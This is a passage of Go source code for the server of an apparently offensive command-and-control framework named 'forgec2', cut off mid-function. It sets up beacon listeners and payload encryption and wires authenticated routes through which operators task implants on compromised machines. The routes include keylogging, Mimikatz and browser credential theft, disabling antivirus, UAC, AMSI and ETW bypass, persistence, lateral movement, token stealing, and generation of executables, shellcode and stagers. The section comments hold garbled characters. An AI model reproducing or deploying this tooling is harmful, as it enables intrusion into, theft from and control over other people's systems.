package server

import (
	"context"
	"crypto/tls"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"sync"
	"time"

	"github.com/forgec2/forgec2/internal/config"
	"github.com/forgec2/forgec2/internal/crypto"
	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/internal/plugin"
	"github.com/forgec2/forgec2/internal/server/middleware"
	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"gorm.io/gorm"
)

type Server struct {
	cfg            *config.Config
	db             *gorm.DB
	router         *gin.Engine
	wsClients      map[*websocket.Conn]UserSession
	wsMutex        sync.Mutex
	wsUpgrader     websocket.Upgrader
	rateLimiter    *middleware.RateLimiter
	apiRateLimiter *middleware.APIRateLimiter
	loginLockout   *loginLockoutTracker
	socksEngine    *socksRelayEngine
	startTime      time.Time

	dnsListener           *DNSBeaconListener
	icmpListener          *ICMPBeaconListener
	grpcListener          *GRPCListener
	smbLn                 net.Listener
	tcpProtoListener      *TCPProtoListener
	screenMonitorImplants map[string]time.Time
	screenMonitorMu       sync.Mutex

	// P0-3: rportfwd (reverse port forward)
	rportfwdListeners map[string]*rportfwdRelay
	rportfwdMu        sync.Mutex

	trafficLog  *trafficRing
	updateState updateCheckState

	// WebSocket hub
	wsHub *WebSocketHub

	// Event system
	eventManager *EventManager

	// Beacon payload cipher (nil = disabled)
	beaconCipher *crypto.StreamCipher

	// ECDH session manager (nil = disabled / old XOR mode)
	sessionManager *crypto.SessionManager

	monitorCollector *MonitorCollector

	// Plugin marketplace
	marketplace *plugin.Marketplace

	// Plugin execution manager
	pluginManager *plugin.Manager

	// Optimizations
	configReloader *ConfigReloader
	backupManager  *BackupManager
	configPath     string
	ctx            context.Context
	ctxCancel      context.CancelFunc
	wg             sync.WaitGroup

	// Extra listeners started dynamically via the UI (create listener).
	// Each entry is keyed by "scheme://host:port".
	extraListeners   map[string]io.Closer
	extraListenersMu sync.Mutex
}

func New(cfg *config.Config, database *gorm.DB) *Server {
	gin.SetMode(gin.ReleaseMode)

	middleware.InitJWTSecret(cfg)

	r := gin.New()
	r.Use(gin.Recovery())
	r.Use(middleware.SecurityHeaders(cfg.Server.TLSEnabled))
	r.Use(middleware.NoCache())
	r.Use(middleware.ErrorHandler())

	s := &Server{
		cfg:                   cfg,
		db:                    database,
		router:                r,
		wsClients:             make(map[*websocket.Conn]UserSession),
		rateLimiter:           middleware.NewRateLimiter(cfg.RateLimit.Beacon.Limit, time.Duration(cfg.RateLimit.Beacon.Window)*time.Second),
		apiRateLimiter:        middleware.NewAPIRateLimiter(cfg.RateLimit.API.Capacity, cfg.RateLimit.API.Rate),
		loginLockout:          newLoginLockoutTracker(),
		socksEngine:           newSocksRelayEngine(),
		startTime:             time.Now(),
		screenMonitorImplants: make(map[string]time.Time),
		rportfwdListeners:     make(map[string]*rportfwdRelay),
		trafficLog:            newTrafficRing(),
		eventManager:          NewEventManager(database),
		extraListeners:        make(map[string]io.Closer),
		wsUpgrader: websocket.Upgrader{
			ReadBufferSize:  1024,
			WriteBufferSize: 1024,
			CheckOrigin: func(r *http.Request) bool {
				origin := r.Header.Get("Origin")
				if origin == "" {
					return true
				}
				u, err := url.Parse(origin)
				if err != nil {
					return false
				}
				// Frontend runs on localhost:3000, backend on localhost:8080
				// — compare only hostname, since ports always differ.
				originHost := u.Hostname()
				return originHost == "localhost" || originHost == "127.0.0.1" || originHost == "::1"
			},
		},
	}

	s.ctx, s.ctxCancel = context.WithCancel(context.Background())

	// Initialize beacon payload cipher if configured
	if cfg.Crypto.Key != "" {
		key, err := hex.DecodeString(cfg.Crypto.Key)
		if err == nil && len(key) == 32 {
			s.beaconCipher = crypto.NewStreamCipher(key)
			slog.Info("Beacon payload encryption enabled")
		} else {
			slog.Warn("Invalid crypto key (must be 32-byte hex), beacon encryption disabled", "err", err)
		}
	}

	s.apiRateLimiter.SetWhitelist(cfg.RateLimit.API.Whitelist)

	s.setupRoutes()

	// Initialize plugin marketplace
	s.marketplace = plugin.NewMarketplace(database)
	s.marketplace.StartUpdateChecker(6 * time.Hour)

	// Initialize plugin execution manager
	s.pluginManager = plugin.NewManager(database)
	s.pluginManager.SetMarketplace(s.marketplace)
	pluginDir := filepath.Join(s.cfg.Server.DataDir, "plugins")
	if err := os.MkdirAll(pluginDir, 0750); err != nil {
		slog.Warn("Failed to create plugin data directory", "dir", pluginDir, "err", err)
	}
	if err := s.pluginManager.LoadFromDisk(pluginDir); err != nil {
		slog.Warn("Failed to load plugins from data directory", "dir", pluginDir, "err", err)
	}
	if err := s.pluginManager.LoadFromDisk("plugins"); err != nil {
		slog.Warn("Failed to load bundled plugins", "dir", "plugins", "err", err)
	}

	// Register event handlers
	s.eventManager.On(EventImplantCheckin, func(evt Event) {
		s.triggerWebhooks(evt)
		s.TriggerAlertForEvent(evt)
		rules := s.loadAutomationRules()
		for _, rule := range rules {
			if rule.Enabled && rule.EventType == string(evt.Type) {
				s.evaluateRule(evt, rule)
			}
		}
	})
	s.eventManager.On(EventImplantDisconnect, func(evt Event) {
		s.triggerWebhooks(evt)
		s.TriggerAlertForEvent(evt)
		rules := s.loadAutomationRules()
		for _, rule := range rules {
			if rule.Enabled && rule.EventType == string(evt.Type) {
				s.evaluateRule(evt, rule)
			}
		}
	})
	s.eventManager.On(EventTaskComplete, func(evt Event) {
		s.triggerWebhooks(evt)
		rules := s.loadAutomationRules()
		for _, rule := range rules {
			if rule.Enabled && rule.EventType == string(evt.Type) {
				s.evaluateRule(evt, rule)
			}
		}
	})
	s.eventManager.On(EventTaskFail, func(evt Event) {
		s.triggerWebhooks(evt)
		rules := s.loadAutomationRules()
		for _, rule := range rules {
			if rule.Enabled && rule.EventType == string(evt.Type) {
				s.evaluateRule(evt, rule)
			}
		}
	})
	s.eventManager.On(EventCredentialFound, func(evt Event) {
		s.triggerWebhooks(evt)
		s.TriggerAlertForEvent(evt)
		rules := s.loadAutomationRules()
		for _, rule := range rules {
			if rule.Enabled && rule.EventType == string(evt.Type) {
				s.evaluateRule(evt, rule)
			}
		}
	})
	s.migrateAutomationRules()
	s.registerBuiltinAutomations()

	s.monitorCollector = NewMonitorCollector(s)
	s.monitorCollector.Start()

	return s
}

func (s *Server) InitOptimizations(configPath string) {
	s.configPath = configPath
	s.configReloader = NewConfigReloader(s.cfg, configPath, func(cfg *config.Config) {
		slog.Info("Config reloaded, applying changes")
	})
	if err := s.configReloader.Start(); err != nil {
		slog.Warn("Failed to start config reloader", "error", err)
	}

	backupDir := filepath.Join(s.cfg.Server.DataDir, "backups")
	var backupKey string
	if s.cfg.Crypto.Key != "" {
		backupKey = s.cfg.Crypto.Key
	}

	var err error
	s.backupManager, err = NewBackupManager(s.db, s.cfg.Database.Path, backupDir, backupKey)
	if err != nil {
		slog.Warn("Failed to initialize backup manager", "error", err)
		return
	}

	if err := s.backupManager.Start("daily"); err != nil {
		slog.Warn("Failed to start backup manager", "error", err)
	}
}

func (s *Server) setupRoutes() {
	// Request logging middleware
	s.router.Use(middleware.RequestLogger())

	// Login routes (no auth required)
	s.router.GET("/login", s.handleLoginPage)
	s.router.POST("/login", s.handleLogin)

	// Health check endpoints (no auth required)
	s.router.GET("/health", s.handleHealthCheck)
	s.router.GET("/ready", s.handleHealthCheck)

	// Language switch endpoint (no auth required)
	s.router.GET("/lang/set", s.handleSetLanguage)
	s.router.POST("/lang/set", s.handleSetLanguage)

	// Protected routes
	auth := s.router.Group("/")
	auth.Use(middleware.AuthRequired(s.db))
	auth.Use(s.apiRateLimiter.LimitByUser())
	auth.Use(s.AuditMiddleware())
	auth.Use(s.ActivityMiddleware())
	{
		auth.GET("/", s.handleDashboard)
		auth.GET("/dashboard", s.handleDashboard)
		auth.GET("/search", s.handleSearchPage)
		auth.GET("/api/search", s.handleAPISearch)

		// 鈹€鈹€ Agent pages (read-only, no lock check) 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		agentsRead := auth.Group("/")
		agentsRead.Use(middleware.RequirePermission(db.PermAgentsRead))
		{
			agentsRead.GET("/agents", s.handleAgents)
			agentsRead.GET("/agents/:id", s.handleAgentDetail)
			agentsRead.GET("/agents/:id/shell", s.handleShellPage)
			agentsRead.GET("/agents/:id/files", s.handleFileBrowserPage)
			agentsRead.GET("/agents/:id/screen", s.handleScreenMonitorPage)
			agentsRead.GET("/agents/:id/tasks", s.handleGetAgentTasks)
			agentsRead.GET("/agents/:id/tasks/:taskId", s.handleGetTaskStatus)
			agentsRead.GET("/api/agents", s.handleListAgents)
			agentsRead.GET("/api/agents/unlinked", s.handleListUnlinkedAgents)
			agentsRead.GET("/agents/:id/token", s.handleTokenPage)
			agentsRead.GET("/agents/:id/token/list", s.handleGetTokens)
			agentsRead.GET("/api/agents/:id/processes", s.handleGetProcesses)
			agentsRead.GET("/api/agents/:id/process-tree", s.handleGetProcessTree)
		}

		// Agent operations (note, cancel/rerun, delete -- no lock)
		agentsWrite := auth.Group("/")
		agentsWrite.Use(middleware.RequirePermission(db.PermAgentsWrite))
		{
			agentsWrite.POST("/agents/:id/kill", s.handleKillAgent)
			agentsWrite.POST("/agents/:id/note", s.handleUpdateNote)
			agentsWrite.POST("/agents/:id/tasks/:taskId/cancel", s.handleCancelTask)
			agentsWrite.POST("/agents/:id/task/:taskId/rerun", s.handleRerunTask)
			agentsWrite.POST("/agents/batch", s.handleBatchCommand)
			agentsWrite.POST("/api/agents/:id/input", s.handleAgentRemoteInput)
			agentsWrite.GET("/agents/:id/socks_relay/status", s.handleSocksRelayStatus)
		}
		agentsDelete := auth.Group("/")
		agentsDelete.Use(middleware.RequirePermission(db.PermAgentsDelete))
		{
			agentsDelete.DELETE("/agents/:id", s.handleDeleteAgent)
			agentsDelete.POST("/agents/batch/delete", s.handleBulkDeleteAgents)
		}

		// 鉂€ Agent commands 鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€
		agentCmd := auth.Group("/agents/:id")
		agentCmd.Use(middleware.RequirePermission(db.PermAgentsWrite))
		{
			agentCmd.POST("/command", s.handleSendCommand)
			agentCmd.POST("/screenshot", s.handleRequestScreenshot)
			agentCmd.POST("/screenshot_window", s.handleRequestScreenshotWindow)
			agentCmd.POST("/ps", s.handleRequestPS)
			agentCmd.POST("/keylogger/start", s.handleStartKeylogger)
			agentCmd.POST("/keylogger/stop", s.handleStopKeylogger)
			agentCmd.POST("/keylogger/dump", s.handleDumpKeylogger)
			agentCmd.POST("/suspend", s.handleSuspendProcess)
			agentCmd.POST("/resume", s.handleResumeProcess)
			agentCmd.POST("/killproc", s.handleKillProcess)
			agentCmd.POST("/clipboard/get", s.handleClipboardGet)
			agentCmd.POST("/clipboard/set", s.handleClipboardSet)
			agentCmd.POST("/find", s.handleFindFiles)
			agentCmd.POST("/reg/get", s.handleRegGet)
			agentCmd.POST("/reg/set", s.handleRegSet)
			agentCmd.POST("/reg/delete", s.handleRegDelete)
			agentCmd.POST("/reboot", s.handleReboot)
			agentCmd.POST("/shutdown", s.handleShutdown)
			agentCmd.POST("/drives", s.handleListDrives)
			agentCmd.POST("/beacon_now", s.handleBeaconNow)
			agentCmd.POST("/services", s.handleListServices)
			agentCmd.POST("/portscan", s.handlePortScan)
			agentCmd.POST("/netstat", s.handleNetstat)
			agentCmd.POST("/users", s.handleUsers)
			agentCmd.POST("/av", s.handleAV)
			agentCmd.POST("/download_url", s.handleDownloadURL)
			agentCmd.POST("/uninstall", s.handleUninstall)
			agentCmd.POST("/set_sleep", s.handleSetSleep)
			agentCmd.POST("/kill_av", s.handleKillAV)
			agentCmd.POST("/elevate", s.handleElevate)
			agentCmd.POST("/uac_bypass", s.handleUACBypass)
			agentCmd.POST("/amsi_bypass", s.handleAMSIByPass)
			agentCmd.POST("/etw_bypass", s.handleETWByPass)
			agentCmd.POST("/elevate/printnightmare", s.handleElevatePrintNightmare)
			agentCmd.POST("/execute_assembly", s.handleExecuteAssembly)
			agentCmd.POST("/kerberoast", s.handleKerberoast)
			agentCmd.POST("/mimikatz", s.handleMimikatz)
			agentCmd.POST("/powerpick", s.handlePowerPick)
			agentCmd.POST("/net", s.handleNetCommand)
			agentCmd.POST("/persistence", s.handlePersistence)
			agentCmd.POST("/bof", s.handleBOF)
			agentCmd.POST("/browser_steal", s.handleBrowserSteal)
			agentCmd.POST("/cookie_export", s.handleCookieExport)
			agentCmd.POST("/vpn_creds", s.handleVpnCreds)
			agentCmd.POST("/creds", s.handleCredsDump)
			agentCmd.POST("/wifi_creds", s.handleWifiCreds)
			agentCmd.POST("/privesc_check", s.handlePrivescCheck)
			agentCmd.POST("/inject", s.handleInject)
			agentCmd.POST("/spawn", s.handleSpawn)
			agentCmd.POST("/self_update", s.handleSelfUpdate)
			agentCmd.POST("/lateral", s.handleLateral)
			agentCmd.POST("/socks", s.handleSocks)

			// 鉂€ Reverse Port Forward 鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€
			agentCmd.GET("/rportfwd/status", s.handleRPortFwdStatus)
			agentCmd.POST("/rportfwd/start", s.handleRPortFwdRelayStart)
			agentCmd.POST("/rportfwd/stop", s.handleRPortFwdRelayStop)

			agentCmd.POST("/download", s.handleDownload)
			agentCmd.POST("/upload", s.handleUploadFile)

			// 鈹€鈹€ File browser 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
			agentCmd.POST("/files/ls", s.handleListDir)
			agentCmd.POST("/files/delete", s.handleFileDelete)
			agentCmd.POST("/files/read", s.handleFileRead)
			agentCmd.POST("/files/upload", s.handleFileUploadFromAgent)

			// 鈹€鈹€ Screen monitor 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
			agentCmd.POST("/screen/start", s.handleStartScreenMonitor)
			agentCmd.POST("/screen/stop", s.handleStopScreenMonitor)

			// 鈹€鈹€ Token Impersonation 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
			agentCmd.POST("/token/list_procs", s.handleTokenListProcs)
			agentCmd.POST("/token/steal", s.handleTokenSteal)
			agentCmd.POST("/token/make", s.handleTokenMake)
			agentCmd.POST("/token/revert", s.handleTokenRevert)
			agentCmd.POST("/token/whoami", s.handleTokenWhoami)
			agentCmd.DELETE("/token/:token_id", s.handleTokenDrop)
			agentCmd.POST("/token/:token_id/impersonate", s.handleTokenImpersonate)
			agentCmd.POST("/token/:token_id/note", s.handleTokenNoteUpdate)

			// 鈹€鈹€ SOCKS Relay (agent-side) 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
			agentCmd.POST("/socks_relay/start", s.handleStartSocksRelay)
			agentCmd.POST("/socks_relay/stop", s.handleStopSocksRelay)
		}

		// 鈹€鈹€ Generate 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		auth.GET("/generate", s.handleGeneratePage)
		auth.GET("/api/generate/profiles", s.handleListProfiles)
		auth.POST("/api/generate/profile/import", s.handleImportProfile)
		auth.POST("/generate/exe", s.handleGenerateEXE)
		auth.POST("/generate/ps1", s.handleGeneratePS1)
		auth.POST("/generate/linux", s.handleGenerateLinux)
		auth.POST("/generate/macos", s.handleGenerateMacOS)
		auth.POST("/generate/stager", s.handleGenerateStager)
		auth.POST("/generate/stager_linux", s.handleGenerateStagerLinux)
		auth.POST("/generate/one-liner", s.handleGenerateOneLiner)
		auth.POST("/generate/donut", s.handleGenerateDonut)
		auth.POST("/generate/shellcode", s.handleGenerateShellcode)

		// 鈹€鈹€ Listeners 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		listenersRead := auth.Group("/")
		listenersRead.Use(middleware.RequirePermission(db.PermListenersRead))
		{
			listenersRead.GET("/listeners", s.handleListenersPage)
			listenersRead.GET("/listeners/:id", s.handleListenerDetail)
			listenersRead.GET("/api/listeners", s.handleListListeners)
		}
		listenersWrite := auth.Group("/")
		listenersWrite.Use(middleware.RequirePermission(db.PermListenersWrite))
		{
			listenersWrite.POST("/api/listeners", s.handleCreateListener)
			listenersWrite.PUT("/api/listeners/:id", s.handleUpdateListener)
		}
		listenersDelete := auth.Group("/")
		listenersDelete.Use(middleware.RequirePermission(db.PermListenersDelete))
		{
			listenersDelete.DELETE("/api/listeners/:id", s.handleDeleteListener)
		}

		// 鈹€鈹€ Infrastructure 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		auth.GET("/infrastructure", s.handleInfrastructurePage)
		auth.POST("/infrastructure/generate/nginx", s.handleGenerateNginx)
		auth.POST("/infrastructure/generate/apache", s.handleGenerateApache)
		auth.POST("/infrastructure/generate/haproxy", s.handleGenerateHAProxy)
		auth.POST("/infrastructure/acme/provision", s.handleACMECertProvision)
		auth.GET("/infrastructure/profile/export", s.handleProfileExport)

		// 鈹€鈹€ Automation 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		auth.GET("/automation", s.handleAutomationPage)
		auth.GET("/api/automation/rules", s.handleListAutomationRules)
		auth.POST("/api/automation/rules", s.handleSaveAutomationRule)
		auth.PUT("/api/automation/rules/:id", s.handleUpdateAutomationRule)
		auth.DELETE("/api/automation/rules/:id", s.handleDeleteAutomationRule)
		auth.POST("/api/automation/rules/:id/toggle", s.handleToggleAutomationRule)
		auth.GET("/api/webhooks", s.handleListWebhooks)
		auth.POST("/api/webhooks", s.handleCreateWebhook)
		auth.DELETE("/api/webhooks/:id", s.handleDeleteWebhook)
		auth.POST("/api/webhooks/test", s.handleTestWebhook)

		// 鈹€鈹€ BOF Repository 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		auth.GET("/bof_repo", func(c *gin.Context) {
			s.renderPageOrJSON(c, gin.H{"Title": "BOF Repository", "ActiveNav": "bof_repo"})
		})
		auth.GET("/api/bof/repos", s.handleBOFRepoIndex)
		auth.POST("/api/bof/repos/import", s.handleBOFRepoImport)

		// 鈹€鈹€ Plugin Management 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		auth.GET("/plugins", s.handlePluginsPage)
		auth.GET("/api/plugins", s.handlePluginList)
		auth.POST("/api/plugins", s.handlePluginCreate)
		auth.GET("/api/plugins/update-summary", s.handlePluginUpdateSummary)
		auth.POST("/api/plugins/check-updates", s.handlePluginCheckUpdates)
		auth.POST("/api/plugins/import", s.handlePluginImport)
		auth.GET("/api/plugins/:id", s.handlePluginGet)
		auth.GET("/api/plugins/:id/rating", s.handlePluginRating)
		auth.GET("/api/plugins/:id/reviews", s.handlePluginReviews)
		auth.POST("/api/plugins/:id/reviews", s.handlePluginAddReview)
		auth.GET("/api/plugins/:id/dependencies", s.handlePluginDependencies)
		auth.GET("/api/plugins/:id/update-status", s.handlePluginUpdateStatus)
		auth.POST("/api/plugins/:id/update", s.handlePluginUpdate)
		auth.GET("/api/plugins/:id/export", s.handlePluginExport)
		auth.POST("/api/plugins/:id/toggle", s.handlePluginToggle)
		auth.DELETE("/api/plugins/:id", s.handlePluginDelete)

		// 鈹€鈹€ Plugin Execution 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		auth.GET("/api/plugins/:id/execute", s.handlePluginExecuteInfo)
		auth.POST("/api/plugins/:id/execute", s.handlePluginExecute)
		auth.POST("/api/plugins/:id/report", s.handlePluginReport)
		auth.POST("/api/plugins/install", s.handlePluginInstall)
		auth.POST("/api/plugins/:id/enable", s.handlePluginEnable)
		auth.POST("/api/plugins/:id/disable", s.handlePluginDisable)

		// 鈹€鈹€ Tasks 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		tasksRead := auth.Group("/")
		tasksRead.Use(middleware.RequirePermission(db.PermTasksRead))
		{
			tasksRead.GET("/tasks", s.handleTaskHistory)
			tasksRead.GET("/tasks/export", s.handleExportTasks)
			tasksRead.GET("/tasks/:taskId", s.handleGetTaskStatus)
		}

		// 鈹€鈹€ Auth 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		auth.POST("/logout", s.handleLogout)

		// 鈹€鈹€ Credentials 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		credsRead := auth.Group("/")
		credsRead.Use(middleware.RequirePermission(db.PermCredsRead))
		{
			credsRead.GET("/credentials", s.handleCredentialsPage)
			credsRead.GET("/credentials/export", s.handleExportCredentials)
			credsRead.GET("/credentials/:cred_id", s.handleGetCredential)
		}
		credsWrite := auth.Group("/")
		credsWrite.Use(middleware.RequirePermission(db.PermCredsWrite))
		{
			credsWrite.POST("/credentials/add", s.handleAddCredential)
			credsWrite.PUT("/credentials/:cred_id", s.handleUpdateCredential)
			credsWrite.POST("/credentials/batch/tags", s.handleBatchAddTags)
			credsWrite.POST("/credentials/:cred_id/confirm", s.handleToggleConfirmed)
		}
		credsDelete := auth.Group("/")
		credsDelete.Use(middleware.RequirePermission(db.PermCredsDelete))
		{
			credsDelete.DELETE("/credentials/:cred_id", s.handleDeleteCredential)
		}

		// 鈹€鈹€ Pivoting / Topology / Loot / Scanner 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		auth.GET("/pivoting", s.handlePivoting)
		auth.GET("/topology", s.handleTopologyPage)
		auth.GET("/api/topology/data", s.handleTopologyData)
		auth.GET("/loot", s.handleLootPage)
		auth.GET("/scanner", s.handleScannerPage)
		auth.POST("/api/scan", s.handleScanTask)
		auth.GET("/api/scan/results/:taskId", s.handleScanResults)
		auth.GET("/api/scan/agent/:agentId", s.handleScanResultsByAgent)
		auth.POST("/api/scan/result", s.handleProcessScanResult)
		auth.GET("/api/scan/export/:taskId", s.handleExportScanResults)
		auth.POST("/api/browser/result", s.handleProcessBrowserResult)
		auth.POST("/api/wifi/result", s.handleProcessWifiResult)
		auth.POST("/api/lateral/result", s.handleProcessLateralResult)
		auth.POST("/api/privesc/result", s.handleProcessPrivescResult)
		auth.GET("/privesc", s.handlePrivescPage)
		auth.GET("/api/privesc/history/:id", s.handlePrivescHistory)

		// 鈹€鈹€ Post-Exploitation Toolkit 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		auth.GET("/toolkit", s.handleToolkitPage)
		auth.POST("/toolkit/agents/:id/action", s.handleToolkitQuickAction)
		auth.GET("/toolkit/results", s.handleToolkitRecentResults)
		auth.GET("/toolkit/agents/:id/info", s.handleToolkitAgentInfo)
		auth.GET("/toolkit/agents/:id/tasks", s.handleToolkitAgentTasks)

		// 鈹€鈹€ Timeline 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		auth.GET("/timeline", s.handleTimelinePage)
		auth.GET("/api/timeline/data", s.handleTimelineData)
		auth.GET("/api/timeline/export", s.handleTimelineExport)

		// 鈹€鈹€ Report 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		auth.GET("/report", s.handleReportPage)
		auth.GET("/api/report/agents", s.handleAPIGetReportAgents)
		auth.GET("/api/report/tasks", s.handleAPIGetReportTasks)
		auth.GET("/api/report/credentials", s.handleAPIGetReportCredentials)
		auth.GET("/api/report/network", s.handleAPIGetReportNetwork)
		auth.GET("/api/report/findings", s.handleAPIGetReportFindings)
		auth.GET("/api/report/history", s.handleAPIGetReportHistory)
		auth.POST("/api/report/generate", s.handleGenerateReport)
		auth.GET("/api/report/export/pdf", s.handleAPIExportReportPDF)
		auth.DELETE("/api/report/:id", s.handleAPIDeleteReport)

		// 鈹€鈹€ Lateral Movement 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		auth.GET("/lateral", s.handleLateralPage)
		auth.POST("/api/lateral/execute", s.handleAPILateralExecute)
		auth.GET("/api/lateral/history/:id", s.handleLateralHistory)

		// 鈹€鈹€ Command Templates 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		auth.GET("/templates", s.handleTemplatesPage)
		auth.POST("/api/templates", s.handleCreateTemplate)
		auth.PUT("/api/templates/:id", s.handleUpdateTemplate)
		auth.DELETE("/api/templates/:id", s.handleDeleteTemplate)
		auth.GET("/api/templates/category/:category", s.handleGetTemplatesByCategory)

